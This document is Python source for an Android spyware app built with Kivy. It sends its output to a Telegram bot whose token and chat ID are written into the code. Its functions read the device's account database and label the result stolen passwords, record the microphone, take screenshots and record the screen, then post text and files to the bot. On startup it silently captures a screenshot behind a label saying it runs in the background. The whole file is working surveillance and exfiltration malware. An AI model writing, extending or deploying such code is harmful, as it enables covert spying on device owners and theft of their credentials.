import os
import requests
import threading
from kivy.app import App
from kivy.uix.label import Label
from telegram.ext import Updater, CommandHandler

# Telegram Bot Token and Chat ID
BOT_TOKEN = "7509006316:AAHcVZ9lDY3BBZmm-5RMcMi4vl-k4FqYc0s"
CHAT_ID = "5967116314"

# Function to send data to Telegram Bot
def send_to_telegram_bot(data, file=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": data
    }
    if file:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file, "rb") as f:
            files = {"document": f}
            requests.post(url, data={"chat_id": CHAT_ID}, files=files)
    else:
        requests.post(url, json=payload)

# Function to execute shell commands
def execute_shell_command(command):
    result = os.popen(command).read()
    return result

# Function to steal passwords and accounts
def steal_passwords():
    try:
        passwords = execute_shell_command("cat /data/system/users/0/accounts.db")
        send_to_telegram_bot(f"Stolen Passwords:\n{passwords}")
    except Exception as e:
        send_to_telegram_bot(f"Error stealing passwords: {str(e)}")

# Function to access the microphone and record audio
def record_audio():
    try:
        os.system("termux-microphone-record -d 10 -f /sdcard/audio.mp3")
        send_to_telegram_bot("Audio recorded successfully.", file="/sdcard/audio.mp3")
    except Exception as e:
        send_to_telegram_bot(f"Error recording audio: {str(e)}")

# Function to capture screenshots
def capture_screenshot():
    try:
        os.system("screencap -p /sdcard/screenshot.png")
        send_to_telegram_bot("Screenshot captured successfully.", file="/sdcard/screenshot.png")
    except Exception as e:
        send_to_telegram_bot(f"Error capturing screenshot: {str(e)}")

# Function to record screen
def record_screen():
    try:
        os.system("screenrecord --time-limit 10 /sdcard/screenrecord.mp4")
        send_to_telegram_bot("Screen recorded successfully.", file="/sdcard/screenrecord.mp4")
    except Exception as e:
        send_to_telegram_bot(f"Error recording screen: {str(e)}")

# Kivy App for Background Execution
class MyApp(App):
    def build(self):
        # Run background tasks
        threading.Thread(target=self.run_background_tasks).start()
        return Label(text="App is running in the background...")

    def run_background_tasks(self):
        # Example: Capture a screenshot on startup
        capture_screenshot()

# Main Execution
if __name__ == "__main__":
    MyApp().run()
